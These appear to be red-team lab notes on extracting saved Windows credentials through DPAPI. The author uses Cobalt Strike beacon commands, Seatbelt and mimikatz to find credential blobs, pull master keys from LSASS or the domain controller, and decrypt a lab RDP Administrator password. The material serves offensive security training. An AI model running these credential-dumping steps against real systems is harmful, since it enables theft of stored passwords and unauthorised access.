

*The way the Windows Credential Manager works is a bit confusing at first - if you read up on the subject, you'll find both the terms "Vaults" and "Credentials".  A "vault" essentially holds records of encrypted credentials and a reference to the encrypted blobs.  Windows has two vaults: Web Credentials (for storing browser credentials) and Windows Credentials (for storing credentials saved by mstsc, etc).  A "credential" is the actual encrypted credential blob.*


on `WKSTN-2` as `bfarmer` use `run vaulcmd /list` to identify `vaults`
```powershell
[12/04 23:52:46] beacon> run vaultcmd /list
[12/04 23:52:46] [*] Tasked beacon to run: vaultcmd /list
[12/04 23:52:46] [+] host called home, sent: 92 bytes
[12/04 23:52:46] [+] received output:
Currently loaded vaults:
	Vault: Web Credentials
	Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
	Location: C:\Users\bfarmer\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

	Vault: Windows Credentials
	Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
	Location: C:\Users\bfarmer\AppData\Local\Microsoft\Vault
```
`run vaultcmd /listcreds:"Windows Credentials" /all` to list the credentials
```powershell
[12/04 23:58:01] beacon> run vaultcmd /listcreds:"Windows Credentials" /all
[12/04 23:58:01] [*] Tasked beacon to run: vaultcmd /listcreds:"Windows Credentials" /all
[12/04 23:58:01] [+] host called home, sent: 124 bytes
[12/04 23:58:02] [+] received output:
Credentials in vault: Windows Credentials

Credential schema: Windows Domain Password Credential
Resource: Domain:target=TERMSRV/sql-2.dev.cyberbotic.io
Identity: SQL-2\Administrator
Hidden: No
Roaming: No
Property (schema element id,value): (100,2)
```
another way to list credentials is `execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault` 
```powershell
[12/05 00:00:50] beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
[12/05 00:00:57] [*] Tasked beacon to run .NET program: Seatbelt.exe WindowsVault
[12/05 00:00:57] [+] host called home, sent: 712016 bytes
[12/05 00:00:58] [+] received output:


                        %&&@@@&&                                                                                  
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%                         
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################                        
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
                        &%%&&&%%%%%        v1.2.1         ,(((&%%%%%%%%%%%%%%%%%,                                 
                         #%%%%##,                                                                                 


====== WindowsVault ======


  Vault GUID     : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
  Vault Type     : Web Credentials
  Item count     : 0

  Vault GUID     : 77bc582b-f0a6-4e15-4e80-61736b6f3b29
  Vault Type     : Windows Credentials
  Item count     : 1
      SchemaGuid   : 3e0e35be-1b77-43e7-b873-aed901b6275b
      Resource     : String: Domain:target=TERMSRV/sql-2.dev.cyberbotic.io
      Identity     : String: SQL-2\Administrator
      PackageSid   : (null)
      Credential   : 
      LastModified : 9/6/2022 10:34:22 AM


[*] Completed collection in 0.022 seconds
```
to identify the name of the credentials navigate to `C:\users\bfarmer\AppData\Local\Microsoft\Credentials` this is the common location where these are stored
```powershell
[12/05 00:01:38] beacon> ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials
[12/05 00:01:38] [*] Tasked beacon to list files in C:\Users\bfarmer\AppData\Local\Microsoft\Credentials
[12/05 00:01:39] [+] host called home, sent: 130 bytes
[12/05 00:01:39] [*] Listing: C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 468b     fil     09/06/2022 10:34:22   6C33AC85D0C4DCEAB186B3B2E5B1AC7C
 10kb     fil     08/30/2022 08:42:59   DFBE70A7E5CC19A398EBF1B96859CE5D
```
seatbelt can also be used for the same thing `execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles`
```powershell
[12/05 00:03:49] beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles
[12/05 00:03:55] [*] Tasked beacon to run .NET program: Seatbelt.exe WindowsCredentialFiles
[12/05 00:03:55] [+] host called home, sent: 712036 bytes
[12/05 00:03:55] [+] received output:


                        %&&@@@&&                                                                                  
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%                         
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################                        
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
                        &%%&&&%%%%%        v1.2.1         ,(((&%%%%%%%%%%%%%%%%%,                                 
                         #%%%%##,                                                                                 


====== WindowsCredentialFiles ======

  Folder : C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\

    FileName     : 6C33AC85D0C4DCEAB186B3B2E5B1AC7C
    Description  : Local Credential Data

    MasterKey    : bfc5090d-22fe-4058-8953-47f6882f549e
    Accessed     : 12/5/2023 12:03:55 AM
    Modified     : 12/5/2023 12:03:55 AM
    Size         : 468

    FileName     : DFBE70A7E5CC19A398EBF1B96859CE5D
    Description  : Local Credential Data

    MasterKey    : bfc5090d-22fe-4058-8953-47f6882f549e
    Accessed     : 12/5/2023 12:03:55 AM
    Modified     : 12/5/2023 12:03:55 AM
    Size         : 11036
```
list directory for `ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\` to identify `SID` then look in the directory that exists for it.
- master keys are stored in the users roaming "Protect" Directory and are encrypted
```powershell
[12/05 00:07:46] beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\
[12/05 00:07:46] [*] Tasked beacon to list files in C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\
[12/05 00:07:46] [+] host called home, sent: 128 bytes
[12/05 00:07:47] [*] Listing: C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     09/25/2023 20:24:29   S-1-5-21-569305411-121244042-2357301523-1104
 24b      fil     08/15/2022 17:34:31   CREDHIST
 76b      fil     09/27/2023 15:46:27   SYNCHIST

```
So we must decrypt the master key first to obtain the actual AES128/256 encryption key, and then use that key to decrypt the credential blob.  There are two ways of doing this.
The first is only possible if you have local admin access on the machine and if the key is cached in LSASS.  It will not be in the cache if the user has not recently accessed/decrypted the credential.

with `SYSTEM` or `ADMIN` access can run `mimikatz !sekurlsa::dpapi`
- deleted all other instances because we know that the `GUID` matches the `masterkeys` from previous commands
```powershell
[12/05 00:11:52] beacon> mimikatz !sekurlsa::dpapi
[12/05 00:11:52] [*] Tasked beacon to run mimikatz's !sekurlsa::dpapi command
[12/05 00:11:52] [+] host called home, sent: 814415 bytes
[12/05 00:11:55] [+] received output:

Authentication Id : 0 ; 1619142 (00000000:0018b4c6)
Session           : RemoteInteractive from 2
User Name         : bfarmer
Domain            : DEV
Logon Server      : DC-2
Logon Time        : 12/4/2023 6:39:25 PM
SID               : S-1-5-21-569305411-121244042-2357301523-1104

	 [00000001]
	 * GUID      :	{bfc5090d-22fe-4058-8953-47f6882f549e}
	 * Time      :	12/4/2023 10:21:30 PM
	 * MasterKey :	8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
	 * sha1(key) :	897f7bf129e6a898ff4e20e9789009d5385be1f3
```
without `SYSTEM` access can request `masterkeys` as long as its your own from the `dc`
`mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc`
```POWERSHELL
[12/05 00:14:04] beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc
[12/05 00:14:04] [*] Tasked beacon to run mimikatz's dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc command
[12/05 00:14:04] [+] host called home, sent: 814463 bytes
[12/05 00:14:20] [+] received output:

[domainkey] with RPC
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
  key : 8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
  sha1: 897f7bf129e6a898ff4e20e9789009d5385be1f3
```
once you have the 
Finally, the blob can be decrypted.


```powershell
[12/05 00:15:17] beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
[12/05 00:15:17] [*] Tasked beacon to run mimikatz's dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214 command
[12/05 00:15:18] [+] host called home, sent: 814458 bytes
[12/05 00:15:19] [+] received output:

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 9/6/2022 10:34:22 AM
  unkFlagsOrSize : 00000040 - 64
  Persist        : 00000002 - 2 - local_machine
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:target=TERMSRV/sql-2.dev.cyberbotic.io
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : SQL-2\Administrator
  CredentialBlob : wIfY&cZ&d?QP9iMFEzckmj.34=@sg.*i
  Attributes     : 0
```